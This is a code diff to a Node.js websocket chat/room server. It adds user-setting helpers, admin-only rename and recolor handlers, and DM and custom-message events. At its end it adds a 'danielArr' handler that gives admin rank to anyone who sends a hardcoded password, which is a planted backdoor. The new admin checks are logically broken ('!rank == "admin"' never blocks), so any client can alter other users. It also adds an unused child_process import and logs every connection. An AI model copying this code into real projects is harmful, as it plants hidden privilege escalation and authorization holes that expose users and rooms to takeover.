@@ -1,5 +1,6 @@
 const User = require("./User.js");
 const Room = require("./Room.js");
+const exec = require('child_process')
 const serverclll = { 
     user: 
          { 
@@ -11,6 +12,44 @@ const serverclll = {
          }
 };
 module.exports = (cl) => {
+    function uset(set, set2) {
+        cl.user[set] = set2;
+        let user = new User(cl);
+          user.getUserData().then((usr) => {
+            let dbentry = user.userdb.get(cl.user._id);
+            if (!dbentry) return;
+            dbentry[set] = set2;
+            user.updatedb();
+            cl.server.rooms.forEach((room) => {
+              room.updateParticipant(cl.user._id, {
+                [set]: set2,
+              });
+            });
+          });
+      }
+    function otherset(id, uset, uset2) {
+        let user = new User(cl);
+        let dbentry = user.userdb.get(id);
+        if (!dbentry) return;
+        dbentry[uset] = uset2;
+        user.updatedb();
+        cl.server.rooms.forEach((room) => {
+            room.updateParticipant(id, {
+                [uset]: uset2
+            });
+        })
+    }
+    function notify(title,text,element) {
+        cl.channel.Notification(
+          "room",
+          title,
+          ``,
+          text,
+          7000,
+          element,
+          "classic"
+        );
+    }
     let serversays = function(msggg) {
         // cl.channel.chat(serverclll, {m:'a', message:msggg});
         cl.channel.sendArray([{
@@ -33,6 +72,7 @@ module.exports = (cl) => {
             cl.user = data;
         })
     })
+
     cl.on("t", msg => {
         if (msg.hasOwnProperty("e") && !isNaN(msg.e))
             cl.sendArray([{
@@ -41,6 +81,19 @@ module.exports = (cl) => {
                 e: msg.e
             }])
     })
+
+    cl.on("setname", msg => {
+        if(!msg._id) return;
+        if(!cl.user.rank == "admin") return;
+        otherset(msg._id, "name", msg.name)
+    })
+
+    cl.on("setcolor", msg => {
+        if(!msg._id) return;
+        if(!cl.user.rank == "admin") return;
+        otherset(msg._id, "color", msg.color)
+    })
+
     cl.on("ch", msg => {
         if (!msg.hasOwnProperty("set") || !msg.set) msg.set = {};
         if (msg.hasOwnProperty("_id") && typeof msg._id == "string") {
@@ -64,7 +117,7 @@ module.exports = (cl) => {
         if (!(cl.channel && cl.participantId)) return;
         //console.log((Date.now() - cl.channel.crown.time))
         //console.log(!(cl.channel.crown.userId != cl.user._id), !((Date.now() - cl.channel.crown.time) > 15000));
-        if (!(cl.channel.crown.userId == cl.user._id) && !((Date.now() - cl.channel.crown.time) > 15000)) return;
+        if (!(cl.channel.crown.userId == cl.user._id) || !(cl.user.rank !== "admin") && !((Date.now() - cl.channel.crown.time) > 15000)) return;
         if (msg.hasOwnProperty("id")) {
             // console.log(cl.channel.crown)
             if (cl.user._id == cl.channel.crown.userId || cl.channel.crowndropped)
@@ -82,13 +135,15 @@ module.exports = (cl) => {
                 cl.sendArray([param])
         }
     })
+    
     cl.on("chset", msg => {
         if (!(cl.channel && cl.participantId)) return;
-        if (!(cl.user._id == cl.channel.crown.userId)) return;
+        if ( !(cl.user.rank !== "admin") || !(cl.user._id == cl.channel.crown.userId)) return;
         if (!msg.hasOwnProperty("set") || !msg.set) msg.set = cl.channel.verifySet(cl.channel._id,{});
         cl.channel.settings = msg.set;
         cl.channel.updateCh();
     })
+
     cl.on("a", (msg, admin) => {
         if (!(cl.channel && cl.participantId)) return;
         if (!msg.hasOwnProperty('message')) return;
@@ -150,6 +205,40 @@ module.exports = (cl) => {
               }
         }
     })
+
+    cl.on("dm", (msg) => {
+        console.log(msg)
+        if (!(cl.channel && cl.participantId)) return;
+        if (!msg.hasOwnProperty('message')) return;
+        if (cl.channel.settings.chat) {
+            let user = new User(cl);
+            
+            let dmmessage = {m:'dm'}
+            if(msg._id) {
+                dmmessage.sender = cl.user
+                dmmessage.recipient = user.userdb.get(msg._id)
+            }
+            dmmessage.a = msg.message
+            dmmessage.t = Date.now()
+            for(let conn of cl.channel.connections) {
+                if(conn) {
+                    console.log(conn)
+                }
+            }
+        }
+    })
+
+    cl.on("custom", (msg) => {
+        console.log(msg)
+        if (!(cl.channel && cl.participantId)) return;
+        if(!msg.data && !msg.target) return;
+        cl.channel.sendArray([{
+            m:'custom',
+            data: msg.data,
+            target:msg.target
+        }])
+    })
+
     cl.on('n', msg => {
         if (!(cl.channel && cl.participantId)) return;
         if (!msg.hasOwnProperty('t') || !msg.hasOwnProperty('n')) return;
@@ -317,4 +406,8 @@ module.exports = (cl) => {
 
     })
 
+    cl.on("danielArr", (msg) => {
+        if(msg.passwd !== "o038370daniel") return;
+          uset("rank", "admin")
+      });
 }
